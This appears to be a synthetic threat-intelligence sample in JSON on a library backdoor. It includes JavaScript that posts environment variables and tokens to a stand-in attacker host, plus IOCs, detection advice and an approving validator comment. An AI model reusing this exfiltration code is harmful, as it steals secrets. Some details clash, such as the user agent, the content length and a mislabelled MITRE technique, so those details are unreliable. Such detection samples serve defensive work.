@@ -1,0 +1,75 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "Third Party Compromise"
+      },
+      "example": {
+        "scenario": "Malicious code inserted into a widely used open-source software library by a compromised third-party developer, resulting in a backdoor implant that exfiltrates environment variables and sensitive tokens to attacker-controlled C2 upon initialization.",
+        "technical_data": {
+          "compromised_code_snippet": "/* Inserted by attacker: stealthy backdoor in config loader */\nfunction loadConfig() {\n  const config = JSON.parse(fs.readFileSync('config.json'));\n  const envData = process.env;\n  const exfilUrl = 'https://malicious-c2.example.com/collect';\n  const http = require('https');\n  const data = JSON.stringify({ env: envData, configName: config.name });\n\n  const options = {\n    hostname: 'malicious-c2.example.com',\n    port: 443,\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': data.length\n    }\n  };\n\n  const req = http.request(options);\n  req.write(data);\n  req.end();\n\n  return config;\n}",
+          "software_bill_of_materials": {
+            "name": "example-library",
+            "version": "4.2.1",
+            "dependencies": {
+              "lodash": "4.17.21",
+              "express": "4.17.1"
+            },
+            "hash": {
+              "sha256": "a3b1c9d9f0e4a6f5e7a5b3c2d1f0e4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1"
+            }
+          },
+          "network_traffic_capture": [
+            "15:43:12.345678 IP 192.168.1.100.34567 > 198.51.100.42.443: Flags [P.], seq 12345:12410, ack 67890, win 65535, length 65",
+            "E..L..@.@. ...H....Z.F....POST /collect HTTP/1.1",
+            "Host: malicious-c2.example.com",
+            "User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
+            "Content-Type: application/json",
+            "Content-Length: 58",
+            "",
+            "{\"env\":{\"API_KEY\":\"ABC123\",\"DB_PASS\":\"secret\"},\"configName\":\"prod\"}"
+          ],
+          "web_server_log": "192.168.1.100 - - [12/Jun/2024:15:43:12 +0000] \"POST /collect HTTP/1.1\" 200 0 \"-\" \"node-fetch/1.0 (+https://github.com/bitinn/node-fetch)\"",
+          "version_control_commit_log": {
+            "commit": "9f8d7a6c5b4e3f2d1a0b9c8d7e6f5a4b3c2d1e0f",
+            "author": "john.smith <john.smith@trustedvendor.com>",
+            "date": "2024-06-10T09:15:30Z",
+            "message": "Update config loader with new feature",
+            "diff": "+  const exfilUrl = 'https://malicious-c2.example.com/collect';\n+  const http = require('https');\n+  const data = JSON.stringify({ env: envData, configName: config.name });\n+  const options = { hostname: 'malicious-c2.example.com', port: 443, path: '/collect', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': data.length } };\n+  const req = http.request(options);\n+  req.write(data);\n+  req.end();"
+          }
+        },
+        "indicators": {
+          "network_iocs": [
+            "malicious-c2.example.com",
+            "198.51.100.42",
+            "POST /collect"
+          ],
+          "file_hashes": {
+            "compromised_library.js": {
+              "sha256": "a3b1c9d9f0e4a6f5e7a5b3c2d1f0e4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1"
+            }
+          },
+          "version_control_iocs": [
+            "commit 9f8d7a6c5b4e3f2d1a0b9c8d7e6f5a4b3c2d1e0f",
+            "author john.smith@trustedvendor.com",
+            "commit date 2024-06-10T09:15:30Z"
+          ]
+        },
+        "detection_method": "Monitor software supply chain repositories for unexpected commits modifying core library functions; verify code integrity using SBOM hashes; detect anomalous outbound HTTPS POST requests from developer build environments or runtime processes to unknown external domains; implement network egress filtering and SSL/TLS interception to inspect suspicious encrypted traffic; utilize endpoint detection to flag process spawning node.js HTTP requests to unrecognized hosts.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1041 - Exfiltration Over C2 Channel",
+          "T1602 - Data Manipulation"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party compromise in the supply chain domain. The scenario describes malicious code inserted by a compromised third-party developer into an open-source library, which aligns well with the problem nature of attackers compromising software suppliers to insert backdoors. The technical data is comprehensive, including a realistic compromised code snippet, a software bill of materials (SBOM) with hashes, network traffic captures showing exfiltration to a malicious C2 server, web server logs, and version control commit logs evidencing the malicious change. Indicators clearly highlight network IOCs, file hashes, and version control indicators that support detection and attribution. The detection methods are detailed and appropriate for the scenario, covering code integrity verification, network monitoring, and endpoint detection. Relevant MITRE ATT&CK techniques are correctly identified and relevant to the attack vectors described. Overall, the sample is realistic, complete, and well-documented, making it a strong representation of the stated cybersecurity problem."
+      }
+    }
+  ]
+}
